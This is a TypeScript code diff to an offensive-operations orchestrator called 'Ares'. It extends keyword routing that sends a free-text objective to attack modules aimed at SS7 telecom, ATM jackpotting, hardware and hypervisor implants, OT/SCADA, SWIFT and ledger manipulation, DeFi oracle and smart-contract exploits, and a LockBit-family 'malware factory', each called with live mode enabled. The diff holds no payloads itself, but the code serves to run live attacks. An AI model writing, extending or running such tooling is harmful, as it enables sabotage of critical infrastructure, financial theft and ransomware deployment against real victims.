@@ -118,8 +118,12 @@ export async function runAresOrchestrator(opts: {
           res.success = true
           break
         case "ares_specialized_impact":
-          const sector = objective.toLowerCase().includes("fiber") ? "undersea_fiber" : 
-                         objective.toLowerCase().includes("building") ? "building_automation" : "ot_scada"
+          const objLower = objective.toLowerCase()
+          const sector = objLower.includes("fiber") ? "undersea_fiber" : 
+                         objLower.includes("building") ? "building_automation" :
+                         objLower.includes("ss7") || objLower.includes("telecom") ? "ss7_telecom" :
+                         objLower.includes("atm") || objLower.includes("jackpot") ? "atm_jackpotting" :
+                         objLower.includes("hardware") || objLower.includes("firmware") || objLower.includes("hypervisor") ? "hardware_implant" : "ot_scada"
           res = await runSpecializedImpact({ sector, target }, { live: true })
           res.success = (res.data?.impactScore ?? 0) > 0
           break
@@ -136,8 +140,12 @@ export async function runAresOrchestrator(opts: {
           res.success = res.data?.luringSuccess ?? true
           break
         case "ares_financial_warfare":
-          const finVector = objective.toLowerCase().includes("clearing") || objective.toLowerCase().includes("swift") ? "swift_gateway" : 
-                            objective.toLowerCase().includes("ledger") ? "ledger_manipulation" : "iso20022_injection"
+          const objL = objective.toLowerCase()
+          const finVector = objL.includes("clearing") || objL.includes("swift") ? "swift_gateway" : 
+                            objL.includes("ledger") ? "ledger_manipulation" : 
+                            objL.includes("flash") || objL.includes("arbitrage") ? "flash_loan_arbitrage" :
+                            objL.includes("oracle") ? "oracle_manipulation" :
+                            objL.includes("smart contract") || objL.includes("defi") || objL.includes("crypto") ? "smart_contract_exploit" : "iso20022_injection"
           res = await runFinancialWarfare({ vector: finVector, live: true })
           res.success = true
           break
@@ -159,7 +167,12 @@ export async function runAresOrchestrator(opts: {
           res.success = true
           break
         case "ares_malware_factory":
-          res = await runMalwareFactory({ family: "LockBit", objective }, { live: true })
+          const objFactory = objective.toLowerCase()
+          const factoryDomain = objFactory.includes("ot") || objFactory.includes("scada") ? "ot_scada" :
+                                objFactory.includes("crypto") || objFactory.includes("defi") ? "crypto_defi" :
+                                objFactory.includes("atm") ? "atm_xfs" :
+                                objFactory.includes("hypervisor") || objFactory.includes("vm") ? "hypervisor_escape" : "general"
+          res = await runMalwareFactory({ family: "LockBit", objective, domain: factoryDomain }, { live: true })
           res.success = res.ok
           break
         case "ares_satellite_c2":
